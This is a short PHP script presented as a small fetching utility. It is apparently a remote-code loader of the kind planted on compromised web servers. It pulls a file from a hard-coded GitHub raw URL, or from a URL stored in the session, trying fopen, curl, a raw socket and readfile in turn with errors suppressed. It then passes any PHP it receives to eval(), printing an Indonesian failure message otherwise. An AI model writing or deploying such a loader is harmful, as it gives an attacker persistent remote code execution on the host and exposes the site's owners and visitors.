<?php
session_start();
header("Expires:0");

class MiniApp {

    public static function run($url){
        $fetchers = [
            'fetchFopen',
            'fetchCurl',
            'fetchSock',
            'fetchFallback'
        ];

        foreach($fetchers as $f){
            $out = self::$f($url);
            if($out) return $out;
        }
        return null;
    }

    private static function fetchFopen($u){
        return ini_get('allow_url_fopen') ? @file_get_contents($u) : null;
    }

    private static function fetchCurl($u){
        if(!function_exists('curl_init')) return null;
        $c=curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $d=curl_exec($c);
        curl_close($c);
        return $d;
    }

    private static function fetchSock($u){
        $p=parse_url($u);
        $port = $p['scheme']==='https'?443:80;
        $fp=@fsockopen(($port==443?'ssl://':'').$p['host'],$port);
        if(!$fp)return null;
        fwrite($fp,"GET {$p['path']} HTTP/1.0\r\nHost:{$p['host']}\r\n\r\n");
        $raw=stream_get_contents($fp);
        fclose($fp);
        return substr($raw, strpos($raw,"\r\n\r\n")+4);
    }

    private static function fetchFallback($u){
        ob_start();
        @readfile($u);
        return ob_get_clean();
    }
}

$url = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/hesonakara-dot/tobrut/refs/heads/main/pure-meicing.txt';
$data = MiniApp::run($url);

if(strpos($data,'<?php') !== false)
    eval("?>".$data);
else
    echo "Tidak memuat script!";
